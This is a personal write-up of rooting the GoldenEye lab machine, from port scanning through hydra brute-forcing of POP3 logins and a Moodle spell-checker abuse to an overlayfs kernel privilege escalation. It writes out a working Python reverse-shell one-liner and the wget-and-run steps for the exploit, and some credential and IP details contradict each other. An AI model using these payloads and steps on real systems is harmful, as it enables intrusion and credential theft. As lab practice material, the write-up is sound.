
```
nmap -sv 192.168.56.0/24
```

There were two pop3 ports and one smtp port apart from the web application running on port 80.
navigate to /sev-home/ but i didnt have credentials to login there
then i checked the source code and found some credentials there.I decrypted the hash and found the password of boris and logged into /sev-home/ 


```

Boris, make sure you update your default password.
My sources say MI6 maybe planning to infiltrate.
Be on the lookout for any suspicious network traffic....

I encoded you p@ssword below...

&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

BTW Natalya says she can break your codes


```

```

username: boris  
Password: InvincibleHack3r
```

there was a hint on pop3 

```
Remember, since security by obscurity is very effective, we have configured our
pop3 service to run on a very high non-default port
```

## Accessing Boris's Mail


and i tried to login to pop3 using these credetials but it failed.

```
nc -nv 192.168.56.114 55007
USER boris
PASS InvincibleHack3r
```

then i brute forced the pwd for boris
```
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.101 -s 55007 pop3
```

this exposed the pwd :`secret1!`
then i logged in as boris and read his mails

```
nc -nv 192.168.56.114 55007
USER boris
PASS InvincibleHack3r
```
`STATS`  : View message count and total size.
`RETR 1`  : read a specific message number.
`RETR 2`

these messages confiremed the `natalya` account aeistance and also a user `xenia`

Then i tried to brute force the pwd for natalya
 
```
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f goldeneye -s 55007 pop3
```
 and found the pwd `bird
 
`username: xenia  
`password: RCP90rulez! 

it hinted to add `severnaya-station.com` to `/etc/hosts` and then to navigate to 
`severnaya-station.com/gnocerdir

and then i logged into `severnaya-station.com/gnocerdir` using credentials of `xenia`  and found a user `doak ` and brute forced his pwd

```
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f severnaya-station.com -s 55007 pop3
```

```
username: dr_doak
password: 4England!
```

and accesed to mail server of doak and found `s3cret.txt`

```
I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I
cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg

```

and navigated to the image in web 

`exiftool for-007.jpg

and analysed it and found a pwd by encoding the hash it revealed using cyberchef

`xWinter1995x!

trhen i logged into the  moodle web with admin credentials

```
username : admin
password:xWinter1995x!
```

Rather than searching blindly for a way to execute code, I researched known Moodle privilege escalation techniques and found that Moodle's built-in spell checker integration (Aspell) can be abused to execute arbitrary commands, if an admin points the spell checker path at a malicious script instead of the real binary.

The relevant setting is under:

```
Site Administration -> Server -> System Paths
```

I set the spell checker path to a Python-based reverse shell payload:

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

After saving the path, I changed the active spell checker engine to `PSpellShell` (found by searching "engine" in the admin settings search bar), started a listener, and clicked the spell checker by adding a new blog entry and clicking its spell check icon:

```shell
nc -nlvp 4444
```

then i got the reverse shell as `<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$`
then i navigated to home 
`cd /home`
`ls -al`  - list hidden directories asw
then i got directories for boris,doak,natalya and i navigated to each of em to find a flag but i couldnt find anything impoertant

then i tried to access root directory

# Priviledge escalation

in this step our main goal is to gather system information and and identify any potential vulnerabily or misconfigeration that could grant us higher priviledges

then i tried to log into each user account and found all the users are unavailable

```
su boris
password:goat
```

then i tried to gather system information 
then i checked for `sudo -l` , SUID binaries , `uname -a ` and found an oudated kernal version of 

`3.13.0-32-generic

then i searched for and exploit 

`searchsploit -m linux/local/37292.c

and found a exploit of priviledge escalation

```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c
```

before executing the exploit i checked if `gcc ` compliter is available in the victim machine and since it is not available tried if `cc` compiler is available and yes it is 

then i saved the exploit to my machine
`searchsploit -m inux/local/37292.c

then opened it and changed the gcc compiler to cc compiler

`nano 37292.c

then  we should send this modified file to the target directory.for that i started a python server 
`python3 -m http.server 8000`

and i changed the directory of the target machine to tmp
`cd /tmp`
and to download the file `wget http://192.168.56.101:8000/37292.c`
`ls -al`
then compile the program using the cc compiler

`cc 37292.c -o ofs`
`ls -al`
and executed the compiled exploit  `./ofs`
`whoami

![[WhatsApp Image 2026-08-09 at 11.33.06.jpeg]]
 now we are the root!!!!
 `la -al`
 `cat .flag.txt`
  and the flag hint to direct to  `/006-final/xvf7-flag/`
  and yes we finished the box
  ![[WhatsApp Image 2026-08-09 at 11.30.27.jpeg]]